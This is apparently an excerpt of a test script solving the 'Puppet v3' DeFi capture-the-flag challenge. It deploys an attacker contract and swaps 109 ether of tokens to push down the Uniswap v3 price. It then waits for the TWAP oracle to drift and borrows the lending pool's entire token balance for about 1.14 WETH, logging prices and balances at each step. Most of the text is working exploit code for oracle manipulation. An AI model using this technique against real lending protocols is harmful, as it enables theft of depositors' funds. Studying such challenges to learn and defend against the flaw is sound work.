...
describe("[Challenge] Puppet v3", function () {
  ...
  /** SET RPC URL HERE */
  const MAINNET_FORKING_URL = process.env.FORKING_URL;
  ...
  it("Execution", async function () {
     ...
     * Step1: Deployment 
     */
    const PuppetV3Attacker = await ethers.getContractFactory("puppetV3Attacker");
    const puppetV3Attacker = await PuppetV3Attacker.deploy(lendingPool.address, uniswapPool.address, token.address, weth.address);
    console.log("Attacker deployed at", puppetV3Attacker.address);
    await token.connect(player).transfer(puppetV3Attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
    console.log("Attacker token balance ",ethers.utils.formatEther((await token.balanceOf(puppetV3Attacker.address)).toString()),);

    /** 
     * Step2: Swapping and time increment
     */
    console.log("Quote before swap",ethers.utils.formatEther(await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)), "ether");
    console.log("current liquidity before swap", (await uniswapPool.liquidity()).toString());
    console.log("current slot0 sqrtpricex96 before swap", (await uniswapPool.slot0())[0].toString());
    console.log("current slot0 tick before swap",(await uniswapPool.slot0())[1].toString(),"\n____________________________________________________");

    await puppetV3Attacker.callSwap(ethers.utils.parseEther("109"))
    console.log("Attacker Weth Balance after swap", ethers.utils.formatEther((await weth.balanceOf(puppetV3Attacker.address)).toString()));
    console.log("Attacker Token Balance after swap",ethers.utils.formatEther((await token.balanceOf(puppetV3Attacker.address)).toString()));
    console.log("Current block number", await ethers.provider.getBlockNumber());
    console.log("Quote after swap",ethers.utils.formatEther(await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)),"ether","\n____________________________________________________");

    await time.increase(100);
    console.log("Current block number", await ethers.provider.getBlockNumber());
    console.log("Quote after 100s",ethers.utils.formatEther(await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)),"ether");
    console.log("current liquidity", (await uniswapPool.liquidity()).toString());
    console.log("current slot0 sqrtpricex96", (await uniswapPool.slot0())[0].toString());
    console.log("current slot0 tick ", (await uniswapPool.slot0())[1].toString());

    /**
     * Step 3: Transfer Weth from attacker contract to player and borrow from pool 
     */
    await puppetV3Attacker.connect(player).withdrawWETH();
    await weth.connect(player).approve(lendingPool.address, ethers.utils.parseEther("1.136"));
    await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    console.log("Seconds lapsed since execution starts", (await ethers.provider.getBlock("latest")).timestamp - initialBlockTimestamp);

    // Check the pool state after all steps
    await puppetV3Attacker.observePool([600, 0]);
    console.log("tickCumulatives at 10min ago", (await puppetV3Attacker.tickCumulatives(0)).toString());
    console.log("tickCumulatives now", (await puppetV3Attacker.tickCumulatives(1)).toString());
    console.log("Weth balance in UniswapPool", ethers.utils.formatEther((await weth.balanceOf(uniswapPool.address)).toString()));
    console.log("Token balance in UniswapPool", ethers.utils.formatEther((await token.balanceOf(uniswapPool.address)).toString()));
  });
